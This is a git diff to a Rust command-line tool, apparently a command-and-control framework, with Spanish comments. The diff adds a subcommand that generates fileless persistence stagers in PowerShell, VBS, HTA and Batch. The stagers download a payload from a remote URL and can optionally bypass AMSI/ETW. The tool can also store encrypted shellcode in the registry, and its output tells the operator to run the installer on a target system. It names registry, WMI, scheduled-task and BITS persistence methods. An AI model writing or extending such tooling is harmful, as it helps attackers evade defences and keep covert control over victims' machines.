@@ -6,6 +6,7 @@ mod patch;
 // mod pe_loader; // Disabled - using donut.exe instead
 mod sc_generator;
 mod stage_builder;
+mod stager_generator;
 
 use clap::{Parser, Subcommand};
 use dll_encrypt::{encrypt_dll, generate_random_key, xor_encrypt};
@@ -112,6 +113,28 @@ enum Commands {
         /// Directorio de salida para los binarios
         #[arg(short, long, default_value = "dist")]
         output: String,
+    },
+
+    /// Genera stagers de persistencia fileless (PowerShell, VBS, HTA, Batch)
+    /// Para deployar persistencia 100% en memoria sin escribir archivos a disco
+    GenerateStagers {
+        /// URL de descarga del payload (servidor HTTP/HTTPS)
+        #[arg(short, long)]
+        url: String,
+
+        /// Directorio de salida para los stagers
+        #[arg(short, long, default_value = "output/stagers")]
+        output: String,
+
+        /// Archivo shellcode opcional para embe
+
+der en registro
+        #[arg(short, long)]
+        shellcode: Option<PathBuf>,
+
+        /// Habilitar bypass de AMSI/ETW (PowerShell)
+        #[arg(long, default_value = "true")]
+        amsi_bypass: bool,
     },
 }
 
@@ -537,6 +560,84 @@ fn main() {
                     std::process::exit(1);
                 }
             }
+        }
+
+        Commands::GenerateStagers {
+            url,
+            output,
+            shellcode,
+            amsi_bypass,
+        } => {
+            use stager_generator::{generate_all_stagers, generate_registry_shellcode_installer, StagerConfig};
+
+            println!("🔧 C2R2 Fileless Persistence Stager Generator v2.0");
+            println!("🌐 Payload URL: {}", url);
+            println!("📂 Output: {}/", output);
+            println!("🛡️  AMSI Bypass: {}", if amsi_bypass { "ENABLED" } else { "DISABLED" });
+            println!("{}", "-".repeat(50));
+
+            let config = StagerConfig {
+                download_url: url,
+                encryption_key: dll_encrypt::generate_random_key(32),
+                shellcode: None,
+                output_dir: PathBuf::from(&output),
+                enable_amsi_bypass: amsi_bypass,
+                add_junk_code: true,
+            };
+
+            // Generate all stager types
+            match generate_all_stagers(&config) {
+                Ok(_) => {
+                    println!("\n✅ ¡Stagers generados exitosamente!");
+                    println!("📦 Archivos generados:");
+                    println!("   • persistence_stager.ps1 (PowerShell)");
+                    println!("   • persistence_stager.vbs (VBScript)");
+                    println!("   • persistence_stager.hta (HTML Application)");
+                    println!("   • persistence_stager.bat (Batch + PowerShell)");
+                }
+                Err(e) => {
+                    eprintln!("❌ Error generando stagers: {}", e);
+                    std::process::exit(1);
+                }
+            }
+
+            // If shellcode provided, generate registry installer
+            if let Some(shellcode_path) = shellcode {
+                println!("\n📦 Generando instalador de shellcode en registro...");
+                match fs::read(&shellcode_path) {
+                    Ok(shellcode_bytes) => {
+                        let config_with_shellcode = StagerConfig {
+                            shellcode: Some(shellcode_bytes),
+                            ..config
+                        };
+                        match generate_registry_shellcode_installer(
+                            config_with_shellcode.shellcode.as_ref().unwrap(),
+                            &config_with_shellcode,
+                        ) {
+                            Ok(path) => {
+                                println!("   ✓ Instalador de registro: {}", path.display());
+                                println!("\n📋 Para usar:");
+                                println!("   1. Ejecuta install_registry_shellcode.ps1 en el sistema objetivo");
+                                println!("   2. El shellcode se almacenará cifrado en el registro");
+                                println!("   3. Se creará persistencia 100% en memoria (sin archivos)");
+                                println!("   4. El payload se ejecutará en cada inicio de sesión");
+                            }
+                            Err(e) => {
+                                eprintln!("❌ Error generando instalador de registro: {}", e);
+                            }
+                        }
+                    }
+                    Err(e) => {
+                        eprintln!("❌ Error leyendo shellcode: {}", e);
+                    }
+                }
+            }
+
+            println!("\n🎯 Métodos de persistencia fileless implementados:");
+            println!("   • Registry Shellcode: Almacena shellcode cifrado en registro");
+            println!("   • WMI Memory Exec: Ejecución en memoria vía WMI");
+            println!("   • Scheduled Task Download: Descarga y ejecuta desde URL");
+            println!("   • BITS Job: Transfer en segundo plano vía BITS");
         }
     }
 }
